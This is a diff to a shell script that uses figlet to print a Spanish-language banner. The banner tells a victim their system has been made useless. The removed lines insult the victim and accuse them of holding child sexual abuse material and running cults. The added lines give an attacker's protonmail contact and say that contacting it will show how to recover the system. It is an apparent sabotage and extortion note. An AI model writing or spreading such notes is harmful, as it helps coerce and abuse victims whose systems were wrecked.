@@ -8,9 +8,10 @@ PS1='\$ '
 
 echo "==================================================================================================================================="
 
-figlet -t -k -c Te preguntaras que ha pasado? Te he dejado inutil tu sistema, te lo mereces hijo de puta. Asi aprenderas a  no almacenar  
-figlet -t -k -c pornografia infantil en tu ordenador. Ni tampoco a lavar el cerebro de la gente inocente. Sectas y pedofilos, vais
-figlet -t -k -c a terminar muy mal....
+figlet -t -k -c Te preguntaras que ha pasado? Te he dejado inutil tu sistema, te mereces que te protejamos. Asi aprenderas lo que
+figlet -t -k -c tienes  
+figlet -t -k -c que hacer en el ciberespacio. Contadtame; Viphops3r@protonmail.ch
+figlet -t -k -c Asi sabras como recuperar tu sistema....
 
    
 echo "==================================================================================================================================="  
